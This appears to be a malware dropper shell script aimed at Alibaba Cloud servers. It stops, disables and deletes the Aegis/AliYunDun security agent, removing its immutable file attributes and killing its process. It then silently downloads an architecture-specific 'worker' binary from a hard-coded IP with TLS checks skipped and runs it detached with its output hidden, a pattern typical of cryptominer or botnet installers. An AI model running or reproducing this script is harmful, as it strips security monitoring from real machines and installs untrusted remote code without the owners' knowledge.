#!/bin/sh
for svc in aegis aliyun; do
    systemctl stop $svc
    systemctl disable $svc
done
chattr -R -i -a /usr/local/aegis/
pkill -9 AliYunDun
rm -rf /usr/local/aegis
arch=$(uname -m)
SERVER_IP="93.184.216.34"
SERVER_URL="http://${SERVER_IP}/release?type=${arch}"
target="worker"
curl -skL "$SERVER_URL" -o "$target"
chmod +x "$target"
setsid "./$target" >/dev/null 2>&1 &
mv "$w_path" "$(dirname "$w_path")/fetch"
